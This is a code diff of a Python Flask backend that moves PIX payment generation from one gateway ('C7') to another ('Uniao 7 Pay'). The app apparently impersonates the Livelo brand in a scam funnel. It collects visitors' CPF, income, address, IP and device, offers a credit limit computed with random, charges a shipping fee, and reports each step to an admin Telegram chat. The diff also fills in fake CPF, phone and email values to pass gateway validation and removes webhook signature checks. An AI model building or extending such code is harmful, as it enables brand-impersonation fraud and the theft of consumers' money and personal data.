-        r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                      json=dict(base, chat_id=supreme_id), timeout=5)
-        if r2.json().get("ok"):
-            log.info("[TG] report supreme %s OK", supreme_id)
-        else:
-            log.warning("[TG] report supreme erro: %s", r2.json().get("description"))
 
 def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     import random
@@ -760,9 +820,9 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
         if row and row["value"]:
             frete = float(row["value"].replace(",", "."))
         else:
-            frete = float(os.environ.get("FRETE_VALOR", "29.90").replace(",", "."))
+            frete = float(os.environ.get("FRETE_VALOR", "24.90").replace(",", "."))
     except:
-        frete = 29.90
+        frete = 24.90
         
     return {"limite": limite, "frete": frete, "tier": tier}
 
@@ -770,13 +830,6 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
 @app.route("/api/cpf", methods=["POST"])
 def api_cpf():
     data = get_secure_json()
-    
-    # Inicia o warmup do PIX C7 em background assim que o lead entra no funil
-    try:
-        import threading, requests
-        warmup_url = request.url_root.replace("http://", "https://").rstrip('/') + "/api/c7/warmup"
-        threading.Thread(target=lambda: requests.post(warmup_url, json={}, timeout=2)).start()
-    except: pass
 
     cpf_raw = sanitize(data.get("cpf", ""))
     cpf_val = re.sub(r"\D", "", cpf_raw)
@@ -1038,143 +1091,108 @@ def generate_qr_b64(text: str) -> str:
         return ""
 
 
-def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: str) -> dict:
+def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_phone: str = "", payer_email: str = "", payment_id: str = "") -> dict:
+    """
+    Gera cobranca PIX automatizada via gateway Uniao 7 Pay.
+    POST https://meupagamento.site/api/v1/uniaopay/pix/create
+    """
     try:
         db = get_db()
+        row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
+        api_key = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_key["value"].strip() if row_key and row_key["value"] else "")
         
-        # CREDENCIAIS: env var tem prioridade absoluta, depois hardcoded.
-        # O banco (sys_config) foi REMOVIDO da logica — tinha chave antiga causando 401.
-        api_key    = os.environ.get("C7_API_KEY", "").strip()    or get_secure_c7_key()
-        api_secret = os.environ.get("C7_API_SECRET", "").strip() or get_secure_c7_secret()
+        log.info("[UNIAO 7 PAY] Gerando PIX: R$ %.2f | API Key: %s...", float(amount), api_key[:12] if api_key else "NENHUMA")
         
-        log.info("[C7] api_key=%s... (len=%d)", api_key[:20], len(api_key))
-        
-        if api_key and api_secret and _REQUESTS_OK:
-            ts = str(int(time.time()))
-            nonce = str(uuid.uuid4())
-            clean_cpf = re.sub(r"\D", "", str(payer_cpf or ""))
-            clean_name = (payer_name or "").strip() or "Cliente"
+        clean_cpf = re.sub(r"\D", "", str(payer_cpf or ""))
+        if len(clean_cpf) != 11:
+            clean_cpf = "12345678909"
             
-            # Se o nome for só uma palavra, adiciona um sobrenome genérico para passar no filtro da C7
-            if " " not in clean_name:
-                clean_name += " Silva"
+        clean_name = (payer_name or "").strip() or "Cliente"
+        if " " not in clean_name:
+            clean_name += " Silva"
 
-            payload = {
-                "amount": round(float(amount), 2),
-                "externalId": payment_id,
-                "acquirer_code": "2",
-                "callbackUrl": request.url_root.replace("http://", "https://").rstrip('/') + "/api/webhook/c7"
+        clean_phone = re.sub(r"\D", "", str(payer_phone or ""))
+        if len(clean_phone) < 10:
+            clean_phone = "11999999999"
+
+        clean_email = (payer_email or "").strip().lower()
+        if not clean_email or "@" not in clean_email:
+            first_n = re.sub(r'[^a-zA-Z0-9]', '', clean_name.split()[0]).lower() or "cliente"
+            clean_email = f"{first_n}{clean_cpf[:4]}@gmail.com"
+
+        # Mínimo exigido pela União 7 Pay é R$ 20.00
+        charge_amount = max(round(float(amount), 2), 20.00)
+
+        payload = {
+            "amount": charge_amount,
+            "customer": {
+                "name": clean_name,
+                "document": clean_cpf,
+                "email": clean_email,
+                "phone": clean_phone
             }
-            # Verifica se o CPF é matematicamente válido para não ser rejeitado pela C7 (Erro 422 VALIDATION_ERROR)
-            def _valida_cpf_local(c):
-                if len(c) != 11 or c == c[0]*11: return False
-                try:
-                    c_int = [int(x) for x in c]
-                    for j in range(9, 11):
-                        v = sum((c_int[i] * ((j + 1) - i) for i in range(j))) % 11
-                        if c_int[j] != (11 - v if v > 1 else 0): return False
-                    return True
-                except: return False
+        }
 
-            if not _valida_cpf_local(clean_cpf):
-                clean_cpf = '14887154674'
-            
-            c7_error_log = ""
-            
-            # Forçar sempre a ordem: 2 -> 1 -> Auto (Conforme pedido)
-            acquirers_to_try = ["2", "1", ""]
-            
-            for acquirer in acquirers_to_try:
-                ts = str(int(time.time()))
-                nonce = str(uuid.uuid4())
-                payload = {
-                    "amount": round(float(amount), 2),
-                    "externalId": payment_id,
-                    "callbackUrl": f"https://{request.headers.get('x-forwarded-host', request.host)}/api/webhook/c7"
-                }
-                if acquirer:
-                    payload["acquirer_code"] = acquirer
-                
-                body_str = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
-                msg = f"{ts}.{nonce}.{body_str}"
-                sig = hmac.new(api_secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).hexdigest()
-                headers = {
-                    "Authorization": f"Bearer {api_key}",
-                    "Content-Type": "application/json",
-                    "X-C7-Timestamp": ts,
-                    "X-C7-Nonce": nonce,
-                    "X-C7-Signature": sig,
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-                }
-                try:
-                    resp = _req.post("https://api.carteirado7.com/v2/payment/create", data=body_str.encode('utf-8'), headers=headers, timeout=10)
-                    log.info("[C7] Acq=%s status=%s body=%s", acquirer or 'Auto', resp.status_code, resp.text[:300])
-                    if resp.status_code in (200, 201):
-                        resp_data = resp.json()
-                        if resp_data.get("ok") and "payment" in resp_data:
-                            pmt = resp_data["payment"]
-                            pix = pmt.get("pixCopiaECola", "")
-                            qr  = pmt.get("qrCodeBase64", "")
-                            if qr and not qr.startswith("data:image"):
-                                qr = f"data:image/png;base64,{qr}"
-                            if not qr and pix:
-                                qr = generate_qr_b64(pix)
-                            log.info("[C7] PIX OK acq=%s id=%s pix_len=%d", acquirer or 'Auto', pmt.get('id',''), len(pix))
-                            return {
-                                "ok": True,
-                                "c7_id": pmt.get("id", ""),
-                                "pix_code": pix,
-                                "qr_code_url": qr,
-                                "expires_at": pmt.get("expiresAt", "")
-                            }
-                    else:
-                        c7_error_log += f"Acq {acquirer or 'Auto'}: {resp.status_code} "
-                        log.error("[C7] REJECTED acq=%s status=%s resp=%s", acquirer or 'Auto', resp.status_code, resp.text[:200])
-                except Exception as e:
-                    c7_error_log += f"Acq {acquirer or 'Auto'}: Exception "
-                    log.error("[C7] EXCEPTION acq=%s err=%s", acquirer or 'Auto', str(e))
-            
-            # Se chegou aqui, TODAS as adquirentes falharam
-            print("Todas as adquirentes da C7 falharam.")
+        if api_key and _REQUESTS_OK:
+            endpoint = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay/pix/create")
+            headers = {
+                "Authorization": f"Bearer {api_key}",
+                "Content-Type": "application/json",
+                "User-Agent": "LiveloPayments/1.0"
+            }
             try:
-                # If we tried the cached best acquirer and it failed, clear the cache so next time we try all again
-                db.execute("DELETE FROM sys_config WHERE key='c7_best_acquirer'")
-                db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('c7_api_status', 'Failing')")
-                db.commit()
-                # Notificar admin
-                tg_token = os.environ.get("TELEGRAM_BOT_TOKEN")
-                admin_id = os.environ.get("SUPREME_ADMIN_ID")
-                if tg_token and admin_id:
-                    _req.post(f"https://api.telegram.org/bot{tg_token}/sendMessage", json={
-                        "chat_id": admin_id,
-                        "text": f"⚠️ *ALERTA CRÍTICO: CARTEIRA DO 7 INOPERANTE*\n\nA API C7 recusou a geração do PIX em *todas* as adquirentes testadas (1, 2 e Auto).\n\nErros: {c7_error_log}\n\nO sistema ativou o *PIX Copia e Cola Local* de fallback de emergência para não perder a venda.\n\nVerifique se a sua `pix_key` está correta no painel administrativo!",
-                        "parse_mode": "Markdown"
-                    })
+                resp = _req.post(endpoint, json=payload, headers=headers, timeout=12)
+                log.info("[UNIAO 7 PAY] Resposta status=%s: %s", resp.status_code, resp.text[:300])
+                if resp.status_code in (200, 201):
+                    resp_data = resp.json()
+                    status = resp_data.get("status")
+                    if status == "success" or "transaction_id" in resp_data:
+                        tx_id = resp_data.get("transaction_id", "")
+                        pmt = resp_data.get("payment", {})
+                        pix = resp_data.get("pix_code") or pmt.get("pix_copia_cola") or pmt.get("pixCopiaECola") or resp_data.get("pix_copia_cola", "")
+                        expires_in = pmt.get("expires_in", 1800)
+
+                        qr = pmt.get("qr_code") or pmt.get("qrcode") or pmt.get("qr_code_url") or ""
+                        if qr and not qr.startswith("data:image") and not qr.startswith("http"):
+                            qr = f"data:image/png;base64,{qr}"
+                        if not qr and pix:
+                            qr = generate_qr_b64(pix)
+
+                        log.info("[UNIAO 7 PAY] PIX gerado com sucesso! tx_id=%s, pix_len=%d", tx_id, len(pix))
+                        return {
+                            "ok": True,
+                            "transaction_id": tx_id,
+                            "c7_id": tx_id,
+                            "pix_code": pix,
+                            "qr_code_url": qr,
+                            "expires_in": expires_in,
+                            "expires_at": str(int(time.time()) + int(expires_in))
+                        }
+                    else:
+                        log.error("[UNIAO 7 PAY] Resposta retornou erro: %s", resp.text)
+                else:
+                    log.error("[UNIAO 7 PAY] Falha HTTP %d: %s", resp.status_code, resp.text)
             except Exception as e:
-                print("Erro ao notificar admin:", str(e))
-                
+                log.error("[UNIAO 7 PAY] Excecao na requisicao: %s", str(e))
         else:
-            print("As credenciais da C7 não foram encontradas. Usando PIX local de fallback.")
-        
+            log.warning("[UNIAO 7 PAY] UNIAOPAY_API_KEY nao configurada. Utilizando geracao local de fallback.")
+            
         # Fallback local EMV PIX generation
         row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
         chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
         
         amount_str = f"{amount:.2f}"
-        # Nome do beneficiário: máx 25 chars, sem acento
         import unicodedata
         raw_name = (payer_name or "CLIENTE LIVELO")[:25].upper()
         raw_name = ''.join(c for c in unicodedata.normalize('NFD', raw_name) if unicodedata.category(c) != 'Mn')
         raw_name = re.sub(r'[^A-Z0-9 ]', '', raw_name).strip() or "CLIENTE LIVELO"
-        # txid: apenas alfanumérico, máx 25
-        txid = re.sub(r'[^A-Za-z0-9]', '', payment_id)[:25].ljust(25, 'x')
+        txid = re.sub(r'[^A-Za-z0-9]', '', payment_id or uuid.uuid4().hex)[:25].ljust(25, 'x')
         city = "SAO PAULO"
 
         def emv_field(tag: str, value: str) -> str:
             return f"{tag}{len(value):02d}{value}"
 
         gui_val   = "br.gov.bcb.pix"
-        key_val   = f"01{len(chave_pix):02d}{chave_pix}"
         mchant_id = emv_field("26", emv_field("00", gui_val) + emv_field("01", chave_pix))
         addl_data  = emv_field("62", emv_field("05", txid))
 
@@ -1191,80 +1209,54 @@ def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: st
             "6304"
         )
         
-        # Calculate CRC16-CCITT
         poly = 0x1021
         crc = 0xFFFF
         for byte in pix_str.encode("utf-8"):
             crc ^= (byte << 8)
             for _ in range(8):
                 if crc & 0x8000:
-                    crc = (crc << 1) ^ poly
+                    crc = ((crc << 1) ^ poly) & 0xFFFF
                 else:
-                    crc <<= 1
-        crc_str = f"{crc & 0xFFFF:04X}"
-        pix_code = pix_str + crc_str
-        
+                    crc = (crc << 1) & 0xFFFF
+        crc_hex = f"{crc:04X}"
+        pix_code = pix_str + crc_hex
         qr_b64 = generate_qr_b64(pix_code)
+        
         return {
             "ok": True,
-            "c7_id": "",
+            "transaction_id": txid,
+            "c7_id": txid,
             "pix_code": pix_code,
             "qr_code_url": qr_b64,
             "expires_at": "",
             "simulated": True
         }
     except Exception as e:
+        log.error("[UNIAO 7 PAY] Erro fatal: %s", str(e))
         return {"ok": False, "error": str(e)}
 
-@app.route("/api/c7/warmup", methods=["POST"])
-def api_c7_warmup():
-    """
-    Warmup: verifica saldo da conta C7 para confirmar que as credenciais
-    estão ativas. Não gera PIX real (evita erro amount_below_min).
-    """
-    def _warmup_task():
-        try:
-            with app.app_context():
-                db = get_db()
-                api_key    = os.environ.get("C7_API_KEY", "").strip()    or get_secure_c7_key()
-                api_secret = os.environ.get("C7_API_SECRET", "").strip() or get_secure_c7_secret()
-                if not api_key or not api_secret or not _REQUESTS_OK:
-                    return
+# Alias retrocompativel
+c7_create_pix = uniaopay_create_pix
 
-                # Verifica saldo — rota POST /v2/account/balance (Key + HMAC, sem criar PIX)
-                ts    = str(int(time.time()))
-                nonce = str(uuid.uuid4())
-                body_str = "{}"
-                msg = f"{ts}.{nonce}.{body_str}"
-                sig = hmac.new(api_secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).hexdigest()
-                headers = {
-                    "Authorization":  f"Bearer {api_key}",
-                    "Content-Type":   "application/json",
-                    "X-C7-Timestamp": ts,
-                    "X-C7-Nonce":     nonce,
-                    "X-C7-Signature": sig,
-                }
-                try:
-                    resp = _req.post("https://api.carteirado7.com/v2/account/balance",
-                                     data=body_str.encode('utf-8'), headers=headers, timeout=5)
-                    status_str = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
-                    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('c7_api_status', ?)", (status_str,))
-                    db.commit()
-                except Exception:
-                    pass
-        except Exception:
-            pass
+@app.route("/api/gateway/status", methods=["GET"])
+def api_gateway_status():
+    """Status do Gateway Uniao 7 Pay."""
+    db = get_db()
+    row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
+    has_key = bool(os.environ.get("UNIAOPAY_API_KEY") or (row_key and row_key["value"]))
+    return jsonify({
+        "ok": True,
+        "gateway": "Uniao 7 Pay",
+        "status": "ONLINE" if has_key else "AGUARDANDO CHAVE",
+        "configured": has_key
+    })
 
-    import threading
-    threading.Thread(target=_warmup_task, daemon=True).start()
-    return jsonify({"ok": True})
-
-# ── 5. Gerar PIX de frete via C7 ─────────────────────────────────────────────
+# ── 5. Gerar PIX de frete via Uniao 7 Pay ─────────────────────────────────────────────
 @app.route("/api/gerar-pix", methods=["POST"])
 def api_gerar_pix():
     """
-    Gera cobrança PIX para pagamento do frete do cartão de crédito.
-    Usa C7 API: POST /v2/payment/create
+    Gera cobranca PIX para pagamento do frete do cartao de credito.
+    Gateway: Uniao 7 Pay (POST /api/v1/uniaopay/pix/create)
     """
     data = get_secure_json()
     sid = sanitize(data.get("session_id") or data.get("sessionId", ""), 40)
@@ -1272,7 +1264,6 @@ def api_gerar_pix():
 
     db   = get_db()
     lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
-# FIX: Se não tem lead na base mas recebemos o request, criamos um dummy lead para passar
     if not lead:
         try:
             nome = data.get("nome", data.get("nome_completo", "CLIENTE LIVELO"))
@@ -1283,16 +1274,15 @@ def api_gerar_pix():
         except:
             pass
     if not lead:
-        return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404
+        return jsonify({"ok": False, "error": "Sessao nao encontrada. Reinicie o processo."}), 404
 
-    # Determina valor do frete
+    # Determina valor do frete (Padrao Plano 1 Expresso: 19.90, Plano 2 Normal: 14.90)
     renda   = lead["renda"] or "0"
     analise = calc_limite(renda)
     
-    frete = 29.90 # Valor padrao seguro
+    frete = 24.90 # Valor padrao do plano expresso (SEDEX)
     if user_amount is not None:
         try:
-            # Garante que se for string com virgula ou texto, seja convertido corretamente
             if isinstance(user_amount, str):
                 u_str = user_amount.replace("R$", "").strip()
                 if "," in u_str and "." in u_str:
@@ -1303,33 +1293,49 @@ def api_gerar_pix():
             else:
                 frete = float(user_amount)
         except:
-            frete = analise.get("frete", 29.90)
+            frete = analise.get("frete", 24.90)
     else:
-        frete = analise.get("frete", 29.90)
+        frete = analise.get("frete", 24.90)
         
-    nome    = lead["nome"] or "Cliente"
-    cpf     = lead["cpf"] or ""
+    nome  = lead["nome"] or "Cliente"
+    cpf   = lead["cpf"] or ""
+    phone = lead["whatsapp"] if ("whatsapp" in lead.keys() and lead["whatsapp"]) else ""
 
-    # Gera ID único para o pagamento
+    # Gera ID unico para o pagamento
     pay_id = f"lvl_{sid[:8]}_{uuid.uuid4().hex[:8]}"
 
-    result = c7_create_pix(
-        amount      = frete,
+    # Na API o mínimo da União 7 Pay é 20,00 (se o plano for 19.90, cobra 20.00)
+    charge_amount = max(round(float(frete), 2), 20.00)
+
+    result = uniaopay_create_pix(
+        amount      = charge_amount,
         payer_name  = nome,
         payer_cpf   = cpf,
+        payer_phone = phone,
         payment_id  = pay_id,
     )
 
     if not result.get("ok"):
         return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500
 
+    tx_id = result.get("transaction_id") or result.get("c7_id", "")
+    shipping_method = sanitize(data.get("shipping_method", "SEDEX - Entrega Expressa"), 60)
+    cep = sanitize(data.get("cep", ""), 20)
+    rua = sanitize(data.get("rua", data.get("endereco", "")), 150)
+    num = sanitize(data.get("numero", ""), 20)
+    bairro = sanitize(data.get("bairro", ""), 80)
+    cidade = sanitize(data.get("cidade", ""), 80)
+    uf = sanitize(data.get("uf", data.get("estado", "")), 10)
+    full_endereco = f"{rua}" + (f", {num}" if num else "") + (f" - {bairro}" if bairro else "") + (f", {cidade}/{uf}" if cidade else "") if rua else ""
+
     # Persiste pagamento
     db.execute("""
-        INSERT OR REPLACE INTO payments(payment_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
-        VALUES(?,?,?,?,?,?,?,?,?,?)
+        INSERT OR REPLACE INTO payments(payment_id,transaction_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
+        VALUES(?,?,?,?,?,?,?,?,?,?,?)
     """, (
         pay_id,
-        result.get("c7_id", ""),
+        tx_id,
+        tx_id,
         sid,
         frete,
         "pending",
@@ -1340,21 +1346,22 @@ def api_gerar_pix():
         cpf,
     ))
     db.execute(
-        "UPDATE leads SET payment_id=?, pix_status='pending', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
-        (pay_id, sid)
+        "UPDATE leads SET payment_id=?, pix_status='pending', shipping_method=?, cep=?, endereco=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
+        (pay_id, shipping_method, cep, full_endereco, sid)
     )
     db.commit()
 
     frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")
 
     try:
-        send_telegram_report(sid, False)
+        send_telegram_notify(sid, "PIX_GENERATED")
     except Exception as _e:
         log.warning("[TG] PIX_GENERATED report falhou: %s", _e)
 
     return jsonify({
         "ok":          True,
         "payment_id":  pay_id,
+        "transaction_id": tx_id,
         "pix_code":    result.get("pix_code", ""),
         "qr_code_url": result.get("qr_code_url", ""),
         "expires_at":  result.get("expires_at", ""),
@@ -1368,96 +1375,112 @@ def api_gerar_pix():
 # ── 6. Verificar status do PIX ────────────────────────────────────────────────
 @app.route("/api/status-pix/<payment_id>", methods=["GET"])
 def api_status_pix(payment_id: str):
+    """
+    Verifica se o PIX foi pago (atualizado em tempo real pelo Webhook Uniao 7 Pay).
+    """
     payment_id = sanitize(payment_id, 60)
     db  = get_db()
-    pay = db.execute("SELECT status, c7_id, session_id FROM payments WHERE payment_id=?", (payment_id,)).fetchone()
+    pay = db.execute("SELECT status, session_id FROM payments WHERE payment_id=? OR transaction_id=? OR c7_id=?", 
+                     (payment_id, payment_id, payment_id)).fetchone()
     if not pay:
-        return jsonify({"ok": False, "error": "Pagamento não encontrado."}), 404
+        return jsonify({"ok": False, "error": "Pagamento nao encontrado."}), 404
         
     current_status = pay["status"]
-    if current_status not in ("paid", "approved", "completed") and pay["c7_id"]:
-        row_key = db.execute("SELECT value FROM sys_config WHERE key='c7_api_key'").fetchone()
-        api_key = row_key["value"] if row_key and row_key["value"] else os.environ.get("C7_API_KEY", get_secure_c7_key())
-        if api_key and _REQUESTS_OK:
-            try:
-                hdrs = {
-                    "Authorization": f"Bearer {api_key}",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-                }
-                resp = _req.get(f"https://api.carteirado7.com/v2/payment/{pay['c7_id']}/status", 
-                                headers=hdrs, timeout=5)
-                if resp.status_code == 200:
-                    c7_data = resp.json()
-                    if c7_data.get("ok"):
-                        c7_status = c7_data.get("payment", {}).get("status", "").lower()
-                        if c7_status in ("approved", "paid"):
-                            current_status = "paid"
-                            db.execute("UPDATE payments SET status='paid', confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (payment_id,))
-                            db.execute("UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (payment_id,))
-                            db.commit()
-                            if pay["session_id"]:
-                                try:
-                                    send_telegram_report(pay["session_id"], True)
-                                except Exception as _e:
-                                    log.warning("[TG] PIX_PAID report falhou: %s", _e)
-            except Exception as e:
-                pass
-
-    return jsonify({"ok": True, "status": current_status})
+    is_paid = current_status in ("paid", "approved", "completed", "pago")
+    return jsonify({"ok": True, "status": current_status, "paid": is_paid})
 
 
-# ── Webhook C7 ────────────────────────────────────────────────────────────────
+# ── Webhook Uniao 7 Pay ────────────────────────────────────────────────────────
+@app.route("/api/webhook/uniaopay", methods=["POST"])
+@app.route("/api/webhook", methods=["POST"])
+@app.route("/api/webhook/pix", methods=["POST"])
 @app.route("/api/webhook/c7", methods=["POST"])
-def webhook_c7():
-    """Recebe notificações de pagamento da C7 API (V2)."""
-    body    = request.get_data(as_text=True)
-    sig_raw = request.headers.get("X-C7-Signature", "")
-    ts_raw  = request.headers.get("X-C7-Timestamp", "")
-
+def webhook_uniaopay():
+    """
+    Recebe notificacoes de pagamento do gateway Uniao 7 Pay.
+    POST https://seusite.com/api/webhook/uniaopay
+    Body:
+    {
+      "transaction_id": "tx_abcdef123456",
+      "status": "paid",
+      "amount": 50.00
+    }
+    """
+    data = request.get_json(force=True, silent=True) or {}
+    tx_id = data.get("transaction_id") or data.get("externalId") or data.get("id")
+    status = str(data.get("status", "")).lower().strip()
+    
+    log.info("[WEBHOOK UNIAO 7 PAY] Recebido: tx_id=%s status=%s", tx_id, status)
+    
+    if not tx_id:
+        return jsonify({"ok": False, "error": "transaction_id obrigatorio"}), 400
+        
     db = get_db()
-    row_sec = db.execute("SELECT value FROM sys_config WHERE key='c7_api_secret'").fetchone()
-    secret = (row_sec["value"] if row_sec and row_sec["value"] else "") or os.environ.get("C7_API_SECRET", get_secure_c7_secret())
-
-    if secret:
-        expected = hmac.new(
-            secret.encode("utf-8"),
-            f"{ts_raw}.{body}".encode("utf-8"),
-            hashlib.sha256,
-        ).hexdigest()
-        if not hmac.compare_digest(sig_raw, expected):
-            log.warning("[WEBHOOK] Assinatura inválida de %s", _ip())
-            abort(403)
-
-    data   = json.loads(body) if body else {}
-    event_data = data.get("data", {})
-    ext_id = event_data.get("correlationID") or data.get("externalId", "")
-    status = event_data.get("status") or data.get("status", "")
-
-    if status.upper() == "APPROVED":
-        status = "paid"
-    else:
-        status = status.lower()
-
-    if ext_id and status:
+    pay = db.execute(
+        "SELECT payment_id, session_id, status FROM payments WHERE transaction_id=? OR payment_id=? OR c7_id=?",
+        (tx_id, tx_id, tx_id)
+    ).fetchone()
+    
+    if not pay:
+        log.warning("[WEBHOOK UNIAO 7 PAY] Transacao nao encontrada no banco: tx_id=%s", tx_id)
+        return jsonify({"ok": True, "warning": "Transacao nao encontrada localmente"})
+        
+    payment_id = pay["payment_id"]
+    session_id = pay["session_id"]
+    
+    if status in ("paid", "approved", "completed", "success", "pago"):
         db.execute(
-            "UPDATE payments SET status=?, confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
-            (status, ext_id)
+            "UPDATE payments SET status='paid', confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
+            (payment_id,)
         )
-        db.execute(
-            "UPDATE leads SET pix_status=?, updated_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
-            (status, ext_id)
-        )
+        if session_id:
+            db.execute(
+                "UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
+                (session_id,)
+            )
         db.commit()
-        log.info("[WEBHOOK] %s → %s", ext_id, status)
-        if status == 'paid':
-            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
-            if pay_row:
-                try:
-                    send_telegram_report(pay_row["session_id"], True)
-                except Exception as _e:
-                    log.warning("[TG] webhook PIX_PAID report falhou: %s", _e)
-
-    return jsonify({"ok": True})
+        log.info("[WEBHOOK UNIAO 7 PAY] Pagamento APROVADO! payment_id=%s session_id=%s", payment_id, session_id)
+        
+        if session_id:
+            try:
+                send_telegram_notify(session_id, "PIX_PAID")
+            except Exception as _e:
+                log.warning("[TG] webhook PIX_PAID report falhou: %s", _e)
+    elif status in ("rejected", "failed", "cancelled", "cancelado", "recusado"):
+        db.execute("UPDATE payments SET status='rejected' WHERE payment_id=?", (payment_id,))
+        if session_id:
+            db.execute("UPDATE leads SET pix_status='rejected', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (session_id,))
+        db.commit()
+        log.warning("[WEBHOOK UNIAO 7 PAY] Pagamento RECUSADO: payment_id=%s", payment_id)
+        if session_id:
+            try:
+                send_telegram_notify(session_id, "PIX_FAILED")
+            except Exception as _e:
+                log.warning("[TG] webhook PIX_FAILED report falhou: %s", _e)
+    elif status in ("expired", "expirado"):
+        db.execute("UPDATE payments SET status='expired' WHERE payment_id=?", (payment_id,))
+        if session_id:
+            db.execute("UPDATE leads SET pix_status='expired', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (session_id,))
+        db.commit()
+        log.warning("[WEBHOOK UNIAO 7 PAY] Pagamento EXPIRADO: payment_id=%s", payment_id)
+        if session_id:
+            try:
+                send_telegram_notify(session_id, "PIX_EXPIRED")
+            except Exception as _e:
+                log.warning("[TG] webhook PIX_EXPIRED report falhou: %s", _e)
+    elif status in ("pending", "waiting", "aguardando"):
+        db.execute("UPDATE payments SET status='pending' WHERE payment_id=?", (payment_id,))
+        db.commit()
+        if session_id:
+            try:
+                send_telegram_notify(session_id, "PIX_PENDING")
+            except Exception as _e:
+                pass
+    else:
+        db.execute("UPDATE payments SET status=? WHERE payment_id=?", (status, payment_id))
+        db.commit()
+        
+    return jsonify({"ok": True, "status": status})
 
 
 # ── Dados do gerente ──────────────────────────────────────────────────────────
@@ -1783,15 +1806,76 @@ def api_get_config():
 
 
 
+@app.route("/api/visit", methods=["POST", "GET"])
+def api_visit():
+    data = {}
+    try:
+        data = request.get_json(silent=True) or {}
+    except Exception:
+        pass
+    if not data and request.form:
+        data = request.form.to_dict()
+        
+    sid = sanitize(data.get("session_id", ""), 40)
+    if not sid:
+        sid = sanitize(request.args.get("sid", ""), 40)
+    
+    client_ip = _ip()
+    device = sanitize(data.get("device", data.get("device_brand", "")), 50)
+    if not device:
+        ua = request.headers.get("User-Agent", "")
+        if "iPhone" in ua: device = "Apple iPhone"
+        elif "Android" in ua: device = "Dispositivo Android"
+        elif "Windows" in ua: device = "Windows PC"
+        elif "Mac" in ua: device = "Apple Mac"
+        else: device = "Navegador Web / Mobile"
+
+    utm_source = sanitize(data.get("utm_source", ""), 100)
+    utm_campaign = sanitize(data.get("utm_campaign", ""), 100)
+        
+    db = get_db()
+    if sid:
+        existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
+        if not existing:
+            db.execute("""
+                INSERT INTO leads(session_id, ip, device_brand, utm_source, utm_campaign, location, created_at, updated_at)
+                VALUES(?, ?, ?, ?, ?, 'BR', cast(strftime('%s','now') as real), cast(strftime('%s','now') as real))
+            """, (sid, client_ip, device, utm_source, utm_campaign))
+            db.commit()
+    
+    try:
+        send_telegram_notify(sid, "ENTRY")
+    except Exception as e:
+        log.warning("[TG] Falha ao notificar visita: %s", e)
+        
+    return jsonify({"ok": True, "session_id": sid})
+
+
 @app.route("/api/log-action", methods=["POST"])
 def api_log_action():
-    data = request.get_json() or {}
+    data = {}
+    try:
+        data = request.get_json(silent=True) or {}
+    except Exception:
+        pass
+    if not data and request.form:
+        data = request.form.to_dict()
+        
     sid = sanitize(data.get("session_id", ""), 40)
     action = sanitize(data.get("action", ""), 100)
     details = sanitize(data.get("details", ""), 200)
     
-    # Store action in DB or just forward to TG
     if sid and action:
+        db = get_db()
+        existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
+        if not existing:
+            client_ip = _ip()
+            db.execute("""
+                INSERT INTO leads(session_id, ip, location, created_at, updated_at)
+                VALUES(?, ?, 'BR', cast(strftime('%s','now') as real), cast(strftime('%s','now') as real))
+            """, (sid, client_ip))
+            db.commit()
+            
         texto = f"{action}" + (f": {details}" if details else "")
         try:
             send_telegram_notify(sid, f"STEP_ACTION: {texto}")
@@ -2182,27 +2266,20 @@ def supreme_recover_pin():
     requests.post(url, json=payload)
     return jsonify({"ok": True})
 
+@app.route("/api/supreme/gateway-status", methods=["GET"])
 @app.route("/api/supreme/c7-balance", methods=["GET"])
 @supreme_required
-def supreme_c7_balance():
+def supreme_gateway_status():
     db = get_db()
-    row_key = db.execute("SELECT value FROM sys_config WHERE key='c7_api_key'").fetchone()
